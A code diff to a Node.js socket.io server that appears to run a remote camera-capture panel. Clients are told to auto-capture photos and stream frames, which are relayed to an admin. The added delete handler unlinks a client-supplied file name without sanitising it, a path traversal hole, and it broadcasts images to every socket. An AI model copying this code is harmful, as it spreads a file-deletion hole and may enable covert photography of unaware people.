@@ -13,7 +13,6 @@ if (!fs.existsSync(uploadDir)) {
     fs.mkdirSync(uploadDir);
 }
 
-// Memory Cache for Offline Photos Retention
 let storedPhotos = [];
 let isAutoCaptureOn = true;
 
@@ -35,7 +34,6 @@ app.use('/uploads', express.static(uploadDir));
 io.on('connection', (socket) => {
 
     socket.on('admin-auth-success', () => {
-        // Send all stored/offline photos to newly connected admin
         socket.emit('load-stored-photos', storedPhotos);
     });
 
@@ -43,6 +41,11 @@ io.on('connection', (socket) => {
         if (isAutoCaptureOn) {
             socket.emit('start-auto-capture');
         }
+    });
+
+    // Relay smooth video frame
+    socket.on('live-stream-frame', (frameData) => {
+        io.emit('update-live-stream', frameData);
     });
 
     socket.on('admin-trigger-capture', () => {
@@ -61,13 +64,20 @@ io.on('connection', (socket) => {
         const photoObj = { imageData, fileName };
         storedPhotos.push(photoObj);
 
-        // Keep last 30 photos in cache to optimize server memory
-        if (storedPhotos.length > 30) {
-            storedPhotos.shift();
-        }
+        if (storedPhotos.length > 30) storedPhotos.shift();
 
-        // Broadcast to live Admin
         io.emit('send-photo-to-admin', photoObj);
+    });
+
+    // Handle Delete Request
+    socket.on('delete-photo', (fileName) => {
+        storedPhotos = storedPhotos.filter(p => p.fileName !== fileName);
+        const filePath = path.join(uploadDir, fileName);
+        if (fs.existsSync(filePath)) {
+            fs.unlink(filePath, (err) => {
+                if (!err) console.log(`🗑️ Deleted file: ${fileName}`);
+            });
+        }
     });
 });
 
